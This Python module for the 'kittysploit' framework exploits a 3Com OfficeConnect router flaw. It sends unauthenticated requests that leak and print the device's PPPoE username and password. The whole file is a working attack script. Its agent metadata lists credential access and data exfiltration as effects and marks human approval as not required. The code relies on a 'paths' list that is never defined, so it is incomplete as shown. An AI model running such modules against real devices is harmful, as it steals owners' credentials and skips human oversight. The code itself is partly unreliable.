#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""3Com OfficeConnect Info Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': '3Com OfficeConnect Info Disclosure',
        'description': 'Exploits 3Com OfficeConnect information disclosure vulnerability. If the target is vulnerable it is possible to read sensitive information.',
        'author': ['Luca Carettoni', 'iDefense', 'Marcin Bury'],
        
        'platform': Platform.LINUX,
        'references': ['http://old.sebug.net/paper/Exploits-Archives/2009-exploits/0902-exploits/LC-2008-05.txt', 'http://seclists.org/vulnwatch/2005/q1/42'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            print_status("Sending payload request")
            response = self.http_request(
                method="GET",
                path=self.valid,
            )

            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_success("Exploit success")
                print_info(response.text)
        else:
            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        for path in self.paths:
            response = self.http_request(
                method="GET",
                path=path
            )

            if response is None:
                return False  # target is not vulnerable

            if "pppoe_username" in response.text and "pppoe_password" in response.text:
                self.valid = path
                return True  # target is vulnerable

        return False  # target not vulnerable
